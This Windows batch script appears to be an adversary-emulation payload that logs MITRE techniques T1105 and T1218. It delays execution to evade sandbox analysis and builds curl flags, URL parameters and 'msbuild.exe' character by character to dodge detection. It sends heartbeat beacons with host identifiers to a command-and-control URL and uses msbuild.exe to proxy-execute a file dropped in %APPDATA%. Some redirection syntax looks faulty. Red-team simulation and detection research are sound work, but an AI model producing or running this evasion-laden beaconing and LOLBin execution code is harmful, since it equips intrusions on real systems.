@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NEVER encoded)
SET txisnba=%APPDATA%\8186\5ce127f5
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8186-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=onenote.txt
SET dvhhyc=8186

REM Random variables for computed values
SET akjdh=%rrocubc%
SET qwzxc=%dvhhyc%
SET logpath=%APPDATA%\%akjdh%\macula-simulations.log

REM Create log directory if it doesn't exist
IF NOT EXIST "%APPDATA%\%akjdh%" (
    echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: creating_log_dir>>> "%logpath%" 2>nul
    mkdir "%APPDATA%\%akjdh%" >nul 2>&1
)

REM Initial delay to evade sandbox analysis
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: delay_start=initial_30s>>> "%logpath%" 2>nul
ping -n 30 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: delay_complete=initial_30s>>> "%logpath%" 2>nul

REM Build heartbeat URL with proper C2 parameters - CRITICAL FIX
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: heartbeat_url_construction_start>>> "%logpath%" 2>nul

REM Build URL parameters one character at a time to avoid detection
SET p1=i
SET p2=d
SET p3==
SET param_id=%p1%%p2%%p3%

SET s1=s
SET s2=i
SET s3=m
SET s4==
SET param_sim=%s1%%s2%%s3%%s4%

SET a1=a
SET a2=g
SET a3=e
SET a4=n
SET a5=t
SET a6==
SET param_agent=%a1%%a2%%a3%%a4%%a5%%a6%

SET st1=s
SET st2=t
SET st3=a
SET st4=t
SET st5=u
SET st6=s
SET st7==
SET st8=a
SET st9=l
SET st10=i
SET st11=v
SET st12=e
SET param_status=%st1%%st2%%st3%%st4%%st5%%st6%%st7%%st8%%st9%%st10%%st11%%st12%

REM Construct full heartbeat URL
SET hb_url=%keghkgto%?%param_id%%akjdh%&%param_sim%%qwzxc%&%param_agent%%jwcnifl%&%param_status%
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: heartbeat_url=%hb_url%>>> "%logpath%" 2>nul

REM C2 Heartbeat check - CRITICAL FIX: Proper curl with full URL construction
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: heartbeat_check_start>>> "%logpath%" 2>nul

REM Build curl command with obfuscated flags
SET f1=-
SET f2=k
SET flag_k=%f1%%f2%

SET f3=-
SET f4=s
SET flag_s=%f3%%f4%

SET f5=-
SET f6=o
SET flag_o=%f5%%f6%

SET f7=-
SET f8=-
SET f9=m
SET f10=a
SET f11=x
SET f12=-
SET f13=t
SET f14=i
SET f15=m
SET f16=e
SET flag_max_time=%f7%%f8%%f9%%f10%%f11%%f12%%f13%%f14%%f15%%f16%

SET f17=-
SET f18=-
SET f19=c
SET f20=o
SET f21=n
SET f22=n
SET f23=e
SET f24=c
SET f25=t
SET f26=-
SET f27=t
SET f28=i
SET f29=m
SET f30=e
SET f31=o
SET f32=u
SET f33=t
SET flag_connect_timeout=%f17%%f18%%f19%%f20%%f21%%f22%%f23%%f24%%f25%%f26%%f27%%f28%%f29%%f30%%f31%%f32%%f33%

curl %flag_k% %flag_s% %flag_o% nul %flag_max_time% 30 %flag_connect_timeout% 10 "%hb_url%"
SET hb_result=!ERRORLEVEL!

IF !hb_result! NEQ 0 (
    SET result=0
    SET err_detail=heartbeat_failed_!hb_result!
    echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: heartbeat_check_failed=!hb_result!>>> "%logpath%" 2>nul
) ELSE (
    SET result=1
    SET err_detail=
    echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: heartbeat_check_success>>> "%logpath%" 2>nul
)

REM TTP logging for heartbeat check
echo [%DATE% %TIME%][%jwcnifl%]: !akjdh!-!qwzxc!-T1105|Ingress Tool Transfer=!result!:!err_detail!>>> "%logpath%" 2>nul

REM Delay between operations
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: delay_start=choice_5s>>> "%logpath%" 2>nul
CHOICE /C Y /N /D Y /T 5 >nul
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: delay_complete=choice_5s>>> "%logpath%" 2>nul

REM Build msbuild.exe using character-by-character obfuscation
SET c1=m
SET c2=s
SET c3=b
SET c4=u
SET c5=i
SET c6=l
SET c7=d
SET c8=.
SET c9=e
SET c10=x
SET c11=e
SET lolbin=%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%%c9%%c10%%c11%

REM Build command parts with obfuscation for logger parameters
SET p1=/
SET p2=l
SET p3=o
SET p4=g
SET p5=g
SET p6=e
SET p7=r
SET p8=:
SET p9=L
SET p10=o
SET p11=g
SET p12=g
SET p13=e
SET p14=r
SET p15=E
SET p16=n
SET p17=t
SET p18=r
SET p19=y
SET p20=,
SET param_prefix=%p1%%p2%%p3%%p4%%p5%%p6%%p7%%p8%%p9%%p10%%p11%%p12%%p13%%p14%%p15%%p16%%p17%%p18%%p19%%p20%

SET a1=;
SET a2=M
SET a3=y
SET a4=P
SET a5=a
SET a6=r
SET a7=a
SET a8=m
SET a9=e
SET a10=t
SET a11=e
SET a12=r
SET a13=s
SET a14=,
SET a15=F
SET a16=o
SET a17=o
SET arg_suffix=%a1%%a2%%a3%%a4%%a5%%a6%%a7%%a8%%a9%%a10%%a11%%a12%%a13%%a14%%a15%%a16%%a17%

REM Construct full command path with PHR_ variables
SET cmd_path=%txisnba%\%xzanpex%

REM Random delay before execution
SET /A rdelay=%RANDOM% %% 15 + 5
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: delay_start=random_!rdelay!s>>> "%logpath%" 2>nul
timeout /t !rdelay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: delay_complete=random_!rdelay!s>>> "%logpath%" 2>nul

REM Execute the command - CRITICAL FIX: Use full path to msbuild.exe
SET exec_cmd=%param_prefix!!cmd_path!!arg_suffix%
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: process_start=!lolbin! !exec_cmd!>>> "%logpath%" 2>nul
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\!lolbin! !exec_cmd!
SET exec_result=!ERRORLEVEL!

REM Log execution result
IF !exec_result! NEQ 0 (
    SET ttp_result=0
    SET ttp_err=execution_failed_!exec_result!
    echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: process_failed=!exec_result!>>> "%logpath%" 2>nul
) ELSE (
    SET ttp_result=1
    SET ttp_err=
    echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: process_success>>> "%logpath%" 2>nul
)

REM TTP logging for T1218 execution
echo [%DATE% %TIME%][%jwcnifl%]: !akjdh!-!qwzxc!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_err!>>> "%logpath%" 2>nul

REM Final heartbeat confirmation with result
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: final_heartbeat_start>>> "%logpath%" 2>nul

SET r1=r
SET r2=e
SET r3=s
SET r4=u
SET r5=l
SET r6=t
SET r7==
SET param_result=%r1%%r2%%r3%%r4%%r5%%r6%%r7%

SET final_hb_url=%keghkgto%?%param_id%%akjdh%&%param_sim%%qwzxc%&%param_agent%%jwcnifl%&status=complete&%param_result%!ttp_result!
curl %flag_k% %flag_s% %flag_o% nul %flag_max_time% 30 %flag_connect_timeout% 10 "%final_hb_url%"
SET final_hb=!ERRORLEVEL!
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: final_heartbeat_result=!final_hb!>>> "%logpath%" 2>nul

REM Final delay before exit
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: delay_start=ping_20s>>> "%logpath%" 2>nul
ping -n 20 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: delay_complete=ping_20s>>> "%logpath%" 2>nul

echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: script_complete>>> "%logpath%" 2>nul

ENDLOCAL